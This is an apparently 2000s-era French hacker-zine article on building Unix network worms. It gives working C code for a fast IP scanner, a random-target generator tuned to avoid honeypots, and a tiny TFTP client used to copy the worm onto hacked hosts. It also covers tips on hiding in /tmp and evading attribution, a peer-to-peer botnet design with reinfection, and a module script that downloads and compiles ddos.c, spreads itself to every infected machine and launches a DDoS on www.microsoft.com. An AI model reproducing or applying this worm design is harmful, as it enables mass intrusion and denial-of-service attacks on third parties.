@@ -1,0 +1,467 @@
+                    De la création des vers informatiques
+                              sirius_black
+
+Introduction
+------------
+Il est bon de  rappeler  brievement le fonctionnement d'un ver.  Le ver  agit en
+boucle mais généralement  on étudie son fonctionnement à partir de son lancement
+sur une machine.
+
+Une fois lancé le ver  va rechercher des victimes.  Pour cela il  va scanner des
+plages d'ip à  la recherche de machines vulnérables.  Dans  cet article  nous ne
+prendrons pas un  compte  l'exploitation de la  faille en elle même,  on suppose
+que l'on dispose  d'un exploit qui  va nous donner  par exemple un  shell sur un
+port donné.
+Quand il trouve une victime,  le ver l'attaque et commence  à se recopier sur la
+machine distante.  Une fois recopié il n'a alors plus qu'à lancer la copie qu'il
+vient d'uploader sur la machine.
+
+On va étudier les  différentes étapes les unes après  les autres et pour chacune
+essayer de trouver des améliorations.
+
+Scanner les adresses IPs
+------------------------
+Vitesse. La seule chose important dans cette étape est la vitesse.  Evidement le
+scan est dépendant de la faille que l'on va exploiter.  Si le service vulnérable
+est sur un  port TCP alors nous  allons devoir  établir avec  chaque machine  un
+établissement  complet de  la connexion  (three  way handshake).  Si le  service
+vulnérable utilise  le protocole UDP alors les connexions et donc le scan seront
+bien plus rapides.  La première conclusion  :  utiliser autant  que possible  le
+protocole UDP.  De plus le  protocole UDP a  tendance a être  oublié que ce soit
+par les administrateurs (lorsqu'ils regardent les ports ouverts sur leur machine
+ils ne regardent souvent que les ports tcp),  les hackers  (qui ne  scannent que
+les ports TCP)  et...  les programmeurs qui oublient trop souvent que UDP existe
+lorsqu'ils développent des applications clients/serveurs.
+En conclusion il est recommandé d'utiliser  UDP autant que possible dans le code
+d'un worm.
+
+Revenons à TCP. Si nous sommes obligé de scanner les ports TCP nous pouvons tout
+de même utiliser quelques astuces pour accélérer le scan.
+La solution consiste à utiliser des sockets non-bloquantes. On peut alors ouvrir
+plusieurs sockets qui vont se connecter simultanéement sur plusieurs victimes et
+ensuite ne garder que les connexions qui ont réussi.  En C on utilisera la fonc-
+tion select() avec les macros FD_*.
+
+Voici un petit code que j'ai fait  qui scanne sur le port 139 les 30 adresses IP
+en partant de l'adresse IP fournie en argument :
+
+--cut--cut--
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/select.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <errno.h>
+
+#define MAX_FD 30
+#define PORT 139
+
+int main(int argc,char *argv[])
+{
+  unsigned long ip, temp;
+  struct sockaddr_in sin;
+  int n,err;
+  unsigned int len;
+  int max=0;
+  fd_set fd_group;
+  struct timeval timeout;
+  
+  struct ip_fd
+  {
+    unsigned long ip;
+    int fd;
+  } tab_ip[MAX_FD];
+  
+  len=sizeof(err);
+
+  if(argc!=2)
+  {
+    printf("Usage: %s <ip_addr>\n",argv[0]);
+    exit(1);
+  }
+
+  if((ip=inet_addr(argv[1]))==INADDR_NONE)
+  {
+    printf("Adresse ip invalide!\n");
+    exit(1);
+  }
+  temp=htonl(ip);
+  sin.sin_port=htons(PORT);
+  sin.sin_family=AF_INET;
+  timeout.tv_sec=1;
+  timeout.tv_usec=0;
+  FD_ZERO(&fd_group);
+  for(n=0;n<MAX_FD;n++)
+  {
+    ip=ntohl(temp);
+    tab_ip[n].ip=ip;
+    tab_ip[n].fd=socket(PF_INET,SOCK_STREAM,0);
+    max=((max>(tab_ip[n].fd))?max:(tab_ip[n].fd));
+    sin.sin_addr.s_addr=ip;
+    fcntl(tab_ip[n].fd,F_SETFL,O_NONBLOCK);
+    if((connect(tab_ip[n].fd,(struct sockaddr*)&sin,sizeof(sin)))==-1)
+    {
+      if(errno!=EINPROGRESS)
+      {
+	close(tab_ip[n].fd);
+	temp++;
+	continue;
+      }
+    }
+    FD_SET(tab_ip[n].fd,&fd_group);
+    temp++;
+  }
+  select(max+1,NULL,&fd_group,NULL,&timeout);
+  for(n=0;n<MAX_FD;n++)
+  {
+    if(FD_ISSET(tab_ip[n].fd,&fd_group))
+    {
+      getsockopt(tab_ip[n].fd,SOL_SOCKET,SO_ERROR,&err,&len);
+      sin.sin_addr.s_addr=tab_ip[n].ip;
+      if(err==0)
+      {
+	printf("err=%u\n",err);
+	printf("Port ouvert sur %s\n",inet_ntoa(sin.sin_addr));
+	close(tab_ip[n].fd);
+      }
+    }
+  }
+	
+  return 0;
+}
+--cut--cut--
+
+Il faut bien sûr,  dans le cas où s'est possible,  vérifier dans la  foulé si la
+machine est vulnérable (étudier les éventuelles banières).
+
+On peut aussi accélérer le scan est prenant  soin de ne scanner que les adresses
+IP intéressantes. Un article du 29A-8, nommé "Scanning Two Times Faster" propose
+de garder en dur des correspondances adresses IP/Range/Pays de la forme :
+
+c12bf000,c12bffff,193.43.240.0,193.43.255.255,EU
+c12c0000,c12dffff,193.44.0.0,193.45.255.255,SE
+c12e0000,c12effff,193.46.0.0,193.46.255.255,AT
+c12f0000,c12fffff,193.47.0.0,193.47.255.255,CH
+c1300000,c134ffff,193.48.0.0,193.52.255.255,FR
+
+C'est assez intéressant mais garder des informations en dûr ne me dit trop rien.
+On peut tout  de même  scanner entre  une  ip minimum et  une ip maximum.  Si on
+regarde la façon dont sont attribuées les adresses IP par IANA  (cherchez un txt
+nommé ipv4-adress-space.txt) on remarque que les premières IPs sont généralement
+attribués aux gouvernements, aux armés ou à différents services secrets.
+Il est plus que probable  que certaines organisations  dans ces adresses là  (de
+0.*.*.* à 57.*.*.*) utilisent des honeypots ou différents outils de surveillance
+de l'Internet (les petits-fils de carnivore ?)
+Du côté des adresses IP maximum il est bien évident que l'on ne peut pas scanner
+les réseaux de classe D (multicast) et E.
+On se fixe donc pour bornes les adresses 58.0.0.0 et 224.0.0.0.
+
+La gestion des adresses IPs dans le code doit se  faire dans un format  facile à
+utiliser du point  de vue de la machine.  De ce côté Blaster  est sans doute  le
+modèle à ne pas suivre.
+En effet pour incrémenter une IP Blaster convertissait sa valeur décimale  (long
+non signé  dans la notation  hôte)  et une string de la forme  x.x.x.x  qu'il se
+chargeait d'incrémenter avant de la retransformer en décimale.
+
+Toutes ces transformations font perdre un temps précieux. 
+On peut  se passer de la  forme chaîne de caractères  et n'utiliser que les deux
+notations  décimales  (l'une considère  que les  octets de poids  faible sont en
+premier, l'autre les octets de poids fort sont en premier.)
+Comme la passage d'une notation à l'autre  consiste seulement à faire des opéra-
+tions sur  les octets,  cela se fait  rapidement.  Le scanner précédent  utilise
+cette méthode par le biais des fonctions htonl() et ntohl().
+
+exemple :
+htonl(inet_addr("58.0.0.0"))  donne  973078528
+htonl(inet_addr("223.0.0.0")) donne 3758096384
+
+Il nous  suffit donc  de prendre  un nombre  entre ces  deux bornes,  de changer
+l'ordre des octets par un ntohl() puis de tenter une connexion.  Pour le scan on
+peut utiliser  une structure  associant l'adresse  IP sous forme  décimale  à un
+descripteur sur une socket.
+
+Une petit code pour la génération d'une adresse IP :
+--cut--cut--
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <time.h>
+#include <sys/types.h>
+
+int main(int argc,char *argv[])
+{
+  unsigned long ip;
+  struct sockaddr_in sin;
+  int i;
+
+  srand(time(0));
+  for(i=0;i<40;i++)
+  {
+    ip=(unsigned long)(2785017856.0*rand()/(RAND_MAX+1.0));
+    ip+=973078528L;
+    sin.sin_addr.s_addr=ntohl(ip);
+    printf("%lu -> %s\n",ip,inet_ntoa(sin.sin_addr));
+  }
+  return 0;
+}
+--cut--cut--
+
+Le lancement de ce programme nous donne par exemple :
+2324918322 -> 138.147.112.50
+2067200351 -> 123.54.249.95
+3066650692 -> 182.201.96.68
+2939482108 -> 175.52.239.252
+1916924642 -> 114.65.242.226
+1769914301 -> 105.126.191.189
+3573912186 -> 213.5.146.122
+(...)
+992762485 -> 59.44.90.117         <- minimum
+(...)
+3756299199 -> 223.228.147.191     <- maximum
+1070264318 -> 63.202.239.254
+1166479643 -> 69.135.17.27
+1898601311 -> 113.42.91.95
+1521845168 -> 90.181.131.176
+
+La recopie du ver
+-----------------
+La plupart  des vers  Unix existants supposent  que la machine  attaquée dispose
+d'un serveur FTP.  Par exemple le ADMw0rm se  propage en  exploitant  une faille
+dans BIND, obtenant alors un accès root.  Le ver crée alors un utilisateur w0rm,
+supprime le  fichier hosts.deny,  puis lance un  client FTP  sur la victime pour
+quelle récupère une  copie du ver sur la machine mère.  Evidemment c'est posible
+que la victim ne fasse pas tourner un serveur FTP. Dans ce cas là la victime est
+backdoorée mais ne fera pas tourner le ver.
+Un exemple intéressant de ver est  le Millenium Worm qui s'attaque à différentes
+failles telles que imapd, popper,  ftpd, named et rcp.mountd (l'ancêtre des bots
+windows ?)  Evidemment dans le cas où l'exploit utilisé exploite une faille dans
+un serveur FTP, on sait qu'un serveur FTP est utilisable.
+Si on veut vraiment que notre ver se propage le plus possible il faut trouver un
+moment de le recopier quelque soit les services tournant sur la victime.
+
+Le mieux  est d'utiliser  un client  et un serveur  qui seront  sur  toutes  les
+machines Unix... Seulement ça nous aide pas.  Les rcp et rsh ne sont plus utili-
+sés et ont été remplacés par SSH et SCP qui se basent sur un système d'authenti-
+fication.
+Notre seule solution est d'uploader un client sur la victime (par le biais de la
+ligne de commande)  en ayant lancé  préalablement un  serveur sur  la machine en
+cours.
+
+On a alors le choix entre des 'echo code >> fichier'
+ou un
+cat << EOF > fichier
+code
+EOF
+
+On a dit  qu'il fallait  utiliser le plus possible  le protocole UDP...  on peut
+donc utiliser  par dessus le  protocole TFTP pour  transférer  nos fichiers  (la
+plupart du temps il n'y a pas de clients tftp par défaut sur Linux).  Inutile de
+coder un  super-client.  Au contraire  plus il sera  court  plus on  évitera les
+problèmes liés au dialogue avec le shell.
+
+J'ai fait un mini client TFTP qui n'implémente que la méthode GET :
+--cut--cut--
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+
+#define MODE "netascii"
+#define PORT 6969
+
+int main(int c,char *v[]){char b[516];int s,f,x;unsigned int l;
+struct sockaddr_in a,t;if(c!=3)exit(1);bzero(b,sizeof(b));b[1]=1;
+strcpy(b+2,v[2]);strcpy(b+3+strlen(v[2]),MODE);a.sin_family=AF_INET;
+a.sin_port=htons(PORT);a.sin_addr.s_addr=inet_addr(v[1]);
+s=socket(PF_INET,SOCK_DGRAM,0);
+sendto(s,b,4+strlen(MODE)+strlen(v[2]),0,(struct sockaddr*)&a,sizeof(struct sockaddr));
+f=open(v[2],O_WRONLY|O_CREAT,S_IRUSR|S_IWUSR);l=sizeof(struct sockaddr);
+while((x=recvfrom(s,b,sizeof(b),0,(struct sockaddr*)&t,&l))==516)
+{if(b[1]!=3)exit(1); if(b[3]==1){close(s);a.sin_port=t.sin_port;
+s=socket(PF_INET,SOCK_DGRAM,0);}write(f,b+4,512);b[1]=4;
+sendto(s,b,4,0,(struct sockaddr*)&a,sizeof(struct sockaddr));
+}if(x>=4){write(f,b+4,x-4);b[1]=4;
+sendto(s,b,4,0,(struct sockaddr*)&a,sizeof(struct sockaddr));
+}close(f);return 0;}
+--cut--cut--
+
+Il serait possible de faire encore plus court, par exemple en virant les headers
+toutefois la compilation pourrait poser des problèmes avec certains compilateurs
+un peu moins "cool". C'est pour ça que notre code doit à tout pris compiler avec
+certaines options (-Wall -pedantic) et ce sans cracher la moindre erreur.
+
+Pourquoi préférer du code à un binaire ?  Le code aurait l'avantage de ne donner
+que très peu  d'informations à  une personne  l'extérieure  (on pourait en  plus
+intégrer des routines anti-debug etc).
+On pourrait par exemple avoir recours à la libworm de Michal Zalewski  (lcamtuf)
+auteur  d'une très  bonne doc  :  "I don't  think I  really  love you  (Writting
+Internet worms for fun and profit)".
+
+Seulement  si on  veut que  notre ver  fonctionne  sur  le plus  de plate-formes
+possibles on ne peut pas se permettre de recopier des exécutables ELF.
+
+Avant de faire quoi que ce soit il faut  s'assurer que l'upload de notre code va
+fonctionner.  On va donc se placer dans /tmp où on est quasi certain d'avoir des
+droits en écriture puis créer un répertoire caché qui sera notre nouvelle maison
+:)
+
+Une fois le client TFTP uploadé et compilé,  il faut encore connaitre  l'adresse
+de la machine mère. Comme l'accès shell est toujours actif autant s'en servir.
+En supposant que l'exploit a ouvert un shell sur le port 6969 :
+netstat -atn | grep STA | tr -s [:blank:] " " | cut -d' ' -f 4 | grep 6969 | cut -d: -f1
+nous donnera l'adresse IP.  Il suffit de  passer d'une façon  où d'une  autre le
+résultat de cette commande comme premier argument du client TFTP.
+
+On se sert de ce  client pour récupérer le reste du ver sur la machine mère.  Le
+plus gros problème  (que je ne traiterais pas)  concerne les  firewalls.  Il est
+possible  que l'accès  au serveur soit  interdit  ou que le  client n'ai  pas la
+possibilité d'établir  une connexion  avec l'extérieur.  On pourrait  très  bien
+imaginer un ver qui échange les rôles du client et du serveur dans le cas où une
+configuration ne semble pas fonctionner.
+
+En lisant  cette section vous  vous êtes  peut-être  dit qu'il aurait  suffit de
+mettre le ver sur un serveur web et d'utiliser wget,  lynx ou curl pour recopier
+le ver. C'est vrai que c'est le plus pratique mais :
+- toutes les instances du ver sont dépendantes de ce serveur
+- l'auteur est plus facilement repérable
+
+Prenons l'exemple de Santy qui recherchais ses victimes sur Google : le staff de
+Google a été très réactif et a bloqué  toutes les requêtes concernant les forums
+phpBB.  On  peut supposer  qu'en  hébergeant  notre ver sur  un serveur  ce soit
+l'hébergeur qui supprime les fichiers de lui-même  où à la demande de la police.
+De plus l'hébergeur est  en possession des  logs qui lui permettront de savoir à
+partir de quelle IP vous avez déposé la copie du ver :(
+
+Aller plus loin : le réseau p2p
+-------------------------------
+Pour comprendre  ce  qui  va suivre  je me  dois  de vous expliquer  (ou de vous
+rappeler) quelles sont les différentes architectures p2p existantes.
+
+[*] Architecture centralisée
+Il s'agit des permiers modèles de peer to peer, pas très évolués. Napster est le
+premier à s'être rendu célèbre.
+Le fonctionnement est simple : le client se connecte au serveur de Napster, fait
+une recherche sur "Monthy Pyhton".  Le serveur de Napster  lui renvoit une liste
+d'adresses IP qui possède des ressources correspondant aux critères de recherche
+du client.  Le client n'a  alors plus qu'à se  connecter à un  des peers présent
+dans la liste.
+C'est aussi le principe utilisé par le ver Santy. On vient de voir quels étaient
+les défauts d'une telle architecture :si le serveur meurt, tout le réseau meurt.
+
+[*] Architecture décentralisée
+C'est l'architecure par défaut des vers.  On part d'une première  machine qui va
+infecter  X  bécanes.  Chaque bécane  infecte à son tour  un certain  nombre  de
+bécanes et ainsi de suite.
+
+Mais une application  p2p et un ver  sont bien différents.  Et c'est  là que  ça
+devient intéressant. Si on peut transformer notre ver en une appli p2p alors les
+possibilités d'utilisation du ver deviennent immenses.
+
+Que se passe-t'il dans une telle architecture quand un client recheche un film ?
+Comme il est  complétement  aveugle  il va envoyer  une requête  broadcast  pour
+savoir avec  qui  communiquer.  Les machines  qui recoivent  cette demande  vont
+chacune lui envoyer leur annuaire (une liste d'adresse IP). Le client peut alors
+lancer des recherches plus rapidement en envoyant ses critères de recherches sur
+toutes les ips qu'il connait à la fois.
+
+Si on y réfléchi la création  d'un annuaire ne sert strictement  à rien du point
+de vue du worm étant donné que les ressources ont déjà été transférées X-D
+En revanche ça devient intéressant du point de vue d'un pirate.
+Si chaque ver  conserve une  liste des machines  qu'il a infecté,  le pirate n'a
+qu'à se connecter sur le serveur TFTP  de A et récupérer la liste d'adresse IPs.
+Pour chaque machine présente dans cette liste il va se connecter et récupérer de
+nouvelles IPs qu'il rajoute à sa liste.
+Au bout de quelques  minutes le pirate a  alors une bonne  quantité de  machines
+qu'il peut exploiter :)
+
+Le problème de l'architecture  décentralisée est la possibilité de remonter à la
+première machine infectée...  Il faut vraiment le vouloir mais si l'IP de la box
+mère se trouve sur chaque box  fille alors on peut remonter  jusqu'à une machine
+qui n'a pas de mère (vous suivez ?)
+C'est la que survient (tadam !) la réinfection !!
+Les vers qui patchent  ou empèchent l'exploitation une fois  qu'ils sont  lancés
+sont nombreux. Et dans certains cas c'est mieux ainsi. Mais avec une réinfection
+on brouille  les pistes et surtout on passe  d'une architecture  décentralisée à
+une structure pleine de boucles.
+
+Système de modules
+------------------
+Le système de  module est  très simple.  Chaque  machine  infectée dispose  d'un
+serveur TFTP.  Pour l'instant  on considérait qu'il ne servait qu'à la transmis-
+sion du ver, c'est à dire qu'il n'acceptait que les requêtes GET.
+La gestion des modules consiste à implémenter  une méthode PUT qui  recupère les
+fichiers et... les exécute.
+
+Couplé avec notre système de réseau p2p on arrive à un système démoniaque (niark
+niark :p)
+
+Considérez le code suivant (liste_ip.txt = liste d'ips que le ver a infecté) :
+--cut--cut--
+#!/bin/sh
+# this is fuckbill.sh
+wget http://www.packetstormsecurity.org/repertoire/vers/ddos.c
+gcc -o ddos ddos.c
+cat liste_ip.txt | while read IP
+do
+  tftp_put $IP fuckbill.sh
+done
+./ddos www.microsoft.com
+--cut--cut--
+
+Le pirate upload ce script sur une machine  infectée prise au hazard sur le net.
+La machine en question upload à son tour ce script sur toutes les machines quelle
+a infecté puis  lance un DoS sur  Microsoft.com.  Chaque machine  qui recoit  le
+script exécute les mêmes instructions.
+En moins de temps qu'il ne faut pour le dire Microsoft se fait DDoSé :p
+
+Le système de  module permet de  corriger un  problème propre  à MyDoom.  MyDoom
+incluait la charge finale dans son code et  attendait une date précise  avant de
+lancer une  attaque sur SCO  (une autre version attaquait Microsoft).  Seulement
+les victimes ont  eu le temps de préparer leurs défenses contre MyDoom.  Avec un
+ver ne possédant  pas de charge  utile mais qui  permet de  charger en  quelques
+minutes la charge utile sur  un grand nombre de machines,  on prend par surprise
+les éventuelles victimes  (on peut aussi  utiliser le ver à des fins plus sympas
+comme installer  un programme de calcul  distribué pour la  recherche contre une
+maladie).
+
+Conclusion
+----------
+Bon worm à tous !
+
+Quelques trucs à lire :
+- les études de vers Unix sur whitehats.com
+- le code source de ces vers
+- une analyse de MyDoom (fastest worm ever ?)
+- une analyse de Blaster (code décompilé par Robert Graham)
+- I don't think I really love you - Michal Zalewski
+- Wormz in 21st century - Benny/29A
+- Scanning to times faster (dans 29A-8, auteur = ??)
+- The future of Internet Worms - Crimelabs Research
+- The Worm Turns - Ryan Russell and Tim Mullen
+  C'est le chapitre 2 de "Stealing the Network : How to Own the Box"
+  J'ai lu cet article peu de temps après avoir écris ce document :(
+  mais le ver imaginaire qui y est décrit est très proche de ce à
+  quoi je pensais 8-)
+  A noter qu'un système de scan basé sur la répartition des adresses
+  entre les vers y est décrite :p
+- Etude des reseaux peer-to-peer
+  M. Derbali Mohammed
+  M. Embouazza Fethi
+  (le nom du fichier comporte TER et est au format PDF)
+
+Vous trouverez certains de ces documents/codes sur www.lsdp.net/~lotfree
